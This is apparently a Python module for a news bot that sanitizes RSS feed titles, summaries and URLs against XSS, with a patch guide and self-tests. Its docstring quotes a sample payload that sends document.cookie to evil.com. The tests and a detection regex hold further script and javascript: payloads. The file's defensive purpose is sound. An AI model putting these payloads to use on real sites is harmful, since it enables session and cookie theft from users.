"""
NUZU News — Feed Sanitization Module
=====================================
File: bot_sanitizer.py

PURPOSE:
  Standalone sanitization helpers for bot.py.
  Prevents XSS via feed-injected HTML/JS in article titles, descriptions,
  and source names. Drop this file next to bot.py and import from it.

INTEGRATION:
  At the top of bot.py, add:
    from bot_sanitizer import sanitize_title, sanitize_attr, sanitize_url, sanitize_summary

  Then replace the 4 vulnerable insertion points (see PATCH GUIDE below).

WHY THIS IS CRITICAL:
  bot.py currently inserts raw feed titles directly into HTML:
    f'<span class="title">{display_title}</span>'
  
  If any upstream RSS feed is compromised or sends malicious content like:
    <script>document.location='https://evil.com?c='+document.cookie</script>
  
  That script executes in every user's browser. The _ARTICLE_SUMMARIES dict
  has the same vulnerability.

  feedparser does strip some dangerous tags, but it does NOT fully sanitize
  for HTML injection — it's a parser, not a sanitizer.
"""

import re
import html
import urllib.parse


# ─────────────────────────────────────────────────────────────────────────────
# CHARACTER ALLOWLIST FOR TITLES
# Allow: printable ASCII + common Unicode (accented chars, CJK, Arabic, etc.)
# Block: HTML tags, JS event attrs, data URIs, null bytes, control chars
# ─────────────────────────────────────────────────────────────────────────────

# Tags that are dangerous even when partially present in a title
_DANGEROUS_PATTERNS = re.compile(
    r'<\s*(script|style|iframe|object|embed|link|meta|base|form|input|svg|math)'
    r'|data\s*:\s*text/(html|javascript)'
    r'|on\w+\s*=',          # onclick=, onload=, onerror=, etc.
    re.IGNORECASE
)

# Event-handler attribute patterns that should be stripped from title text
# e.g. "onclick=alert(1)" appearing as literal text in a feed title
_ATTR_EVENT = re.compile(r'\b(on\w{2,20})\s*=\s*', re.IGNORECASE)

# HTML tags (any tag) — strip entirely from titles
_ANY_TAG = re.compile(r'<[^>]{0,200}>')

# Control characters except tab and newline
_CONTROL_CHARS = re.compile(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]')

# Zero-width and other invisible Unicode used in homograph attacks
_INVISIBLE_UNICODE = re.compile(
    r'[\u200B-\u200F\u202A-\u202E\u2060-\u2064\uFEFF\u00AD]'
)

# Repeated whitespace collapse
_WHITESPACE = re.compile(r'\s+')


def sanitize_title(raw: str, max_len: int = 300) -> str:
    """
    Sanitize a feed article title for safe insertion into HTML text content.
    
    Steps:
      1. Bail on obviously dangerous patterns (log a warning)
      2. Strip HTML tags
      3. html.escape() — converts < > & " ' to entities
      4. Remove control chars + invisible Unicode
      5. Collapse whitespace
      6. Truncate to max_len
    
    Returns a string safe for insertion into:
      <span class="title">{{ HERE }}</span>
      data-title="{{ HERE }}"  (via sanitize_attr)
    """
    if not raw:
        return ''

    raw = str(raw)

    # Step 1: Warn on suspicious content (don't silently swallow — log it)
    if _DANGEROUS_PATTERNS.search(raw):
        _warn_sanitize('title', raw[:120])

    # Step 2a: Strip event-handler-like patterns (e.g. "onclick=alert(1)")
    clean = _ATTR_EVENT.sub('', raw)

    # Step 2b: Strip HTML tags first (before escaping, so we remove <script> etc.)
    clean = _ANY_TAG.sub('', clean)

    # Step 3: HTML-escape remaining text (& → &amp;, < → &lt;, etc.)
    clean = html.escape(clean, quote=True)

    # Step 4: Remove invisible/control characters
    clean = _CONTROL_CHARS.sub('', clean)
    clean = _INVISIBLE_UNICODE.sub('', clean)

    # Step 5: Collapse whitespace
    clean = _WHITESPACE.sub(' ', clean).strip()

    # Step 6: Truncate
    if len(clean) > max_len:
        clean = clean[:max_len].rsplit(' ', 1)[0] + '…'

    return clean


def sanitize_attr(raw: str, max_len: int = 300) -> str:
    """
    Sanitize a value for insertion into an HTML attribute (e.g. data-title="...").
    
    Stricter than sanitize_title: also removes single quotes.
    Use for: data-title, title="...", aria-label="..."
    """
    clean = sanitize_title(raw, max_len)
    # Additional: remove remaining quotes that could break out of an attribute
    # html.escape already converts " to &quot;, but single quotes remain
    clean = clean.replace("'", '&#39;')
    return clean


def sanitize_url(raw: str) -> str:
    """
    Sanitize a URL for use in href= attributes.
    
    Allows: http, https
    Blocks: javascript:, data:, vbscript:, file:, and anything else
    Returns '#' for invalid/dangerous URLs.
    """
    if not raw:
        return '#'

    url = str(raw).strip()
    
    # Remove null bytes and control chars
    url = _CONTROL_CHARS.sub('', url)
    
    # Decode percent-encoding to catch encoded javascript:
    try:
        decoded = urllib.parse.unquote(url)
    except Exception:
        decoded = url
    
    # Check decoded version for dangerous schemes
    decoded_lower = decoded.lstrip('\x00\t\r\n ').lower()
    dangerous_schemes = ('javascript:', 'data:', 'vbscript:', 'file:', 'blob:')
    if any(decoded_lower.startswith(s) for s in dangerous_schemes):
        _warn_sanitize('url', url[:120])
        return '#'
    
    # Must start with http:// or https://
    if not re.match(r'^https?://', url, re.IGNORECASE):
        # Could be a relative URL — allow those
        if url.startswith('/') or url.startswith('#') or url.startswith('?'):
            return url
        return '#'
    
    return url


def sanitize_summary(raw: str, max_len: int = 400) -> str:
    """
    Sanitize an AI-generated or feed-extracted article summary blurb.
    
    Same pipeline as sanitize_title but allows a slightly longer output
    since summaries can be longer than headlines.
    """
    return sanitize_title(raw, max_len)


def sanitize_source_name(raw: str) -> str:
    """
    Sanitize a source/outlet name (e.g. 'Reuters', 'BBC News').
    These appear in src-label spans and cluster-src-pills.
    Max 80 chars — source names are never long.
    """
    return sanitize_title(raw, max_len=80)


# ─────────────────────────────────────────────────────────────────────────────
# FEED VALIDATION
# ─────────────────────────────────────────────────────────────────────────────

def validate_feed_entry(entry: dict, source_name: str) -> tuple[bool, str]:
    """
    Validate a feedparser entry dict before processing.
    
    Returns (is_valid, reason_if_invalid).
    
    Checks:
      - title present and non-empty
      - link present and http/https
      - title not suspiciously long (>500 chars = likely garbage)
      - title not all caps (shouting spam)
    """
    title = getattr(entry, 'title', '') or ''
    link  = getattr(entry, 'link', '')  or ''

    if not title or not title.strip():
        return False, 'empty title'

    if len(title) > 500:
        return False, f'title too long ({len(title)} chars)'

    if not link:
        return False, 'no link'

    if not re.match(r'^https?://', link):
        return False, f'non-http link: {link[:60]}'

    # Reject ALL_CAPS titles (common spam/clickbait signal)
    alpha = re.sub(r'[^A-Za-z]', '', title)
    if len(alpha) > 20 and alpha == alpha.upper():
        return False, 'all-caps title (spam)'

    return True, ''


# ─────────────────────────────────────────────────────────────────────────────
# INTERNAL HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _warn_sanitize(field: str, value: str):
    """Log a sanitization warning without crashing the build."""
    import sys
    print(
        f'  [SANITIZE WARN] Suspicious {field} content stripped: {repr(value[:80])}',
        file=sys.stderr
    )


# ─────────────────────────────────────────────────────────────────────────────
# PATCH GUIDE FOR bot.py
# ─────────────────────────────────────────────────────────────────────────────
#
# Add this import near the top of bot.py (after existing imports):
#
#   from bot_sanitizer import (
#       sanitize_title, sanitize_attr, sanitize_url, sanitize_source_name,
#       sanitize_summary, validate_feed_entry
#   )
#
#
# PATCH 1 — Single-source headline rendering (around line 3294 in bot.py):
#
#   BEFORE:
#     clean_title = strip_source_from_title(title)
#     display_title = clean_title[0].upper() + clean_title[1:] if clean_title else clean_title
#     ...
#     safe_title_attr = display_title.replace('"', "'")
#
#   AFTER:
#     clean_title = strip_source_from_title(title)
#     _raw_display = clean_title[0].upper() + clean_title[1:] if clean_title else clean_title
#     display_title  = sanitize_title(_raw_display)       # safe for HTML text
#     safe_title_attr = sanitize_attr(_raw_display)       # safe for HTML attributes
#     link = sanitize_url(link)                           # safe URL
#
#
# PATCH 2 — Multi-source cluster rendering (around line 3330 in bot.py):
#
#   BEFORE:
#     clean_lead = strip_source_from_title(lead_title)
#     display_title = clean_lead[0].upper() + clean_lead[1:] if clean_lead else clean_lead
#     ...
#     safe_title_attr = display_title.replace('"', "'")
#
#   AFTER:
#     clean_lead = strip_source_from_title(lead_title)
#     _raw_display = clean_lead[0].upper() + clean_lead[1:] if clean_lead else clean_lead
#     display_title  = sanitize_title(_raw_display)
#     safe_title_attr = sanitize_attr(_raw_display)
#     lead_link = sanitize_url(lead_link)
#
#
# PATCH 3 — Article summary blurbs (around line 3306 in bot.py):
#
#   BEFORE:
#     _hl_sum = _ARTICLE_SUMMARIES.get(link, '')
#     _hl_sum_html = (f'<span class="hl-summary">{_hl_sum}</span>' if _hl_sum else '')
#
#   AFTER:
#     _hl_sum_raw = _ARTICLE_SUMMARIES.get(link, '')
#     _hl_sum = sanitize_summary(_hl_sum_raw)
#     _hl_sum_html = (f'<span class="hl-summary">{_hl_sum}</span>' if _hl_sum else '')
#
#
# PATCH 4 — Feed entry validation (in _fetch_one_source, around line 2994):
#
#   BEFORE:
#     raw_title = entry.title.strip()
#
#   AFTER:
#     is_valid, reason = validate_feed_entry(entry, source_name)
#     if not is_valid:
#         print(f'  {source_name} - skipping entry: {reason}')
#         continue
#     raw_title = entry.title.strip()
#
#
# PATCH 5 — Source name in cluster pills (around line 3352):
#
#   BEFORE:
#     '<span class="cluster-src-pill">' + s + '</span>'
#
#   AFTER:
#     '<span class="cluster-src-pill">' + sanitize_source_name(s) + '</span>'
#
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# SELF-TEST (run: python3 bot_sanitizer.py)
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    tests = [
        # (input, expected_to_contain, must_not_contain)
        ('<script>alert(1)</script>Breaking News', 'Breaking News', '<script>'),
        ('Trump <b>signs</b> bill', 'Trump', '<b>'),
        ('"Quoted" title & ampersand', '&amp;', '"'),
        ('javascript:void(0)', 'javascript', None),  # safe as text — html.escape handles it
        ('Normal headline about AI developments', 'AI developments', None),
        ('A' * 400, None, None),  # truncation test
        ('\x00\x01Null bytes in title', 'Null bytes', '\x00'),
        ('onclick=alert(1) News', 'News', 'onclick'),
    ]

    url_tests = [
        ('https://reuters.com/story', 'https://reuters.com/story'),
        ('javascript:alert(1)', '#'),
        ('data:text/html,<script>evil</script>', '#'),
        ('http://example.com/path?q=1&r=2', 'http://example.com/path?q=1&r=2'),
        ('', '#'),
        ('/relative/path', '/relative/path'),
    ]

    print('=== sanitize_title tests ===')
    for raw, should_have, must_not_have in tests:
        result = sanitize_title(raw)
        ok = True
        if should_have and should_have not in result:
            ok = False
            print(f'  FAIL: expected "{should_have}" in result')
        if must_not_have and must_not_have in result:
            ok = False
            print(f'  FAIL: "{must_not_have}" found in result')
        print(f'  {"OK  " if ok else "FAIL"} {repr(raw[:50])} → {repr(result[:60])}')

    print('\n=== sanitize_url tests ===')
    for raw, expected in url_tests:
        result = sanitize_url(raw)
        ok = result == expected
        print(f'  {"OK  " if ok else "FAIL"} {repr(raw[:50])} → {repr(result[:60])}')
        if not ok:
            print(f'       expected: {repr(expected)}')

    print('\nAll tests complete.')
